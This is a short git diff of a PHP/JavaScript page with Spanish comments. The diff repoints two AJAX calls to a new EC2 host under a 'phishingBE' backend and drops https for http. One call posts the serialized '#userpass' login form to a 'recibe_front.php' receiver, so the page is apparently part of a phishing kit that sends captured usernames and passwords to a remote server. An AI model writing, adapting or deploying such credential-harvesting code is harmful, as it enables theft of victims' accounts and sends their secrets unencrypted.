@@ -23,7 +23,7 @@ $vid = $_GET['uid'];
         //hace la búsqueda
         $.ajax({
             type: "POST",
-            url: "https://ec2-18-117-162-122.us-east-2.compute.amazonaws.com/phishingBE/v2/pagina.php",
+            url: "http://ec2-52-14-237-239.us-east-2.compute.amazonaws.com/phishingBE/v2/pagina.php",
             data: datos,
             /*       beforeSend: function(){
                          //imagen de carga
@@ -47,7 +47,7 @@ $vid = $_GET['uid'];
 
           $.ajax({
             type: 'post',
-            url: 'https://ec2-18-117-162-122.us-east-2.compute.amazonaws.com/phishingBE/v2/recibe_front.php',
+            url: 'http://ec2-52-14-237-239.us-east-2.compute.amazonaws.com/phishingBE/v2/recibe_front.php',
             data: $('#userpass').serialize(),
             success: function (data) {
                console.log(data);
